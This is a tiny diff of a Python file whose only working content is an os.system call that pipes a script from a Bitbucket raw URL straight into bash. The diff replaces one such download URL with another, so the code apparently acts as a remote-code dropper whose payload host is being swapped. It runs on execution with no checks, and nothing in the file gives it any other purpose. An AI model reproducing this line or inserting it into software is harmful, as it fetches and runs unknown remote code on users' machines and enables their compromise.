@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/mandaresz/feriyaz/raw/1a37405e8a24c06da5fc527c2ae460c848170267/golekupo | bash')
+os.system('curl -sL https://bitbucket.org/dareya/fatra/raw/a19ad71f28c6ae7c3a91028ccfd27767f15d5219/eryaz | bash')
